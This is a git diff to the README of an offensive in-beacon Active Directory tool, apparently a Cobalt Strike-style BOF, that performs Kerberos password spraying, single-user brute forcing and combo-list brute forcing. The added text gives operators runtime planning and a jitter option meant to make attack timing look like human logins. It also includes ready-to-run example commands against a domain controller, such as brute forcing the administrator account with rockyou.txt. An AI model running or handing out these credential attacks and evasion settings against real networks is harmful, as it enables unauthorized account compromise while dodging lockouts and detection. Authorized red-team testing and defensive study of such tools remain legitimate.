@@ -27,6 +27,25 @@ The BOF runs entirely in-process inside the beacon:
 - All crypto is implemented inline or via Windows BCrypt — no CRT
   dependency, no external libraries
 
+### ⚠️ Beacon blocking
+
+**BOFs are synchronous.** The beacon is completely unresponsive for the
+entire duration of a run. Every operator on the team should be aware of
+this before tasking any command.
+
+Estimate your runtime before running:
+
+```
+runtime ≈ users × (avg_delay ± jitter)
+
+Example: 500 users, --delay 1000 --jitter 500
+  worst case:  500 × 1500ms = 750 seconds (~12.5 minutes)
+  best case:   500 × 500ms  = 250 seconds (~4 minutes)
+```
+
+Use `--delay` and `--jitter` to control this. Keep runs targeted — a
+small, curated user list beats a full domain dump for spray ops.
+
 ---
 
 ## Commands
@@ -62,6 +81,8 @@ userenum -d contoso.local --delay 500 /home/operator/users.txt
 Tests one password against every user in the list. AES-256 pre-auth is
 attempted first; falls back to RC4-HMAC if the DC returns `ETYPE_NOSUPP`.
 Increments `badPwdCount`. Generates events **4768** and **4771**.
+**Blocks the beacon until all attempts are complete** — plan runtime with
+`--delay` and `--jitter` before tasking.
 
 ```
 passwordspray -d <domain> -p <password> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <userlist>
@@ -69,7 +90,7 @@ passwordspray -d <domain> -p <password> [--dc <ip>] [--delay <ms>] [--downgrade]
 
 ```
 passwordspray -d contoso.local -p Password123 /home/operator/users.txt
-passwordspray -d contoso.local -p Summer2024! --dc 192.168.1.10 --safe --delay 1000 /home/operator/users.txt
+passwordspray -d contoso.local -p Summer2024! --dc 192.168.1.10 --safe --delay 1000 --jitter 500 /home/operator/users.txt
 ```
 
 ### bruteuser
@@ -84,7 +105,7 @@ bruteuser -d <domain> -u <username> [--dc <ip>] [--delay <ms>] [--downgrade] [--
 
 ```
 bruteuser -d contoso.local -u jdoe /home/operator/rockyou.txt
-bruteuser -d contoso.local -u administrator --dc 192.168.1.10 --safe --delay 200 /home/operator/top500.txt
+bruteuser -d contoso.local -u administrator --dc 192.168.1.10 --safe --delay 200 --jitter 100 /home/operator/top500.txt
 ```
 
 ### bruteforce
@@ -98,7 +119,7 @@ bruteforce -d <domain> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <c
 
 ```
 bruteforce -d contoso.local /home/operator/combos.txt
-bruteforce -d contoso.local --dc 192.168.1.10 --safe --delay 500 -v /home/operator/combos.txt
+bruteforce -d contoso.local --dc 192.168.1.10 --safe --delay 500 --jitter 250 -v /home/operator/combos.txt
 ```
 
 Combo file format — one entry per line:
@@ -119,6 +140,7 @@ All four commands accept the following optional flags:
 |---|---|
 | `--dc <ip>` | DC hostname or IP. If omitted the BOF resolves the KDC via DNS using the domain name. |
 | `--delay <ms>` | Sleep this many milliseconds between each attempt. Recommended for spraying to stay under lockout thresholds. |
+| `--jitter <ms>` | Add random variance to each delay: actual sleep = `delay ± jitter`. Makes timing look like human-driven authentication. Combined with `--delay`, e.g. `--delay 1000 --jitter 500` sleeps between 500ms and 1500ms per attempt. |
 | `--downgrade` | Force RC4-HMAC (etype 23) pre-auth only. Skips the AES-256 attempt. Use against legacy DCs that do not support AES. |
 | `--safe` | Abort all remaining attempts the moment any account comes back as locked out. |
 | `-v` | Verbose — also log wrong passwords, not-found users, and errors (silent by default). |
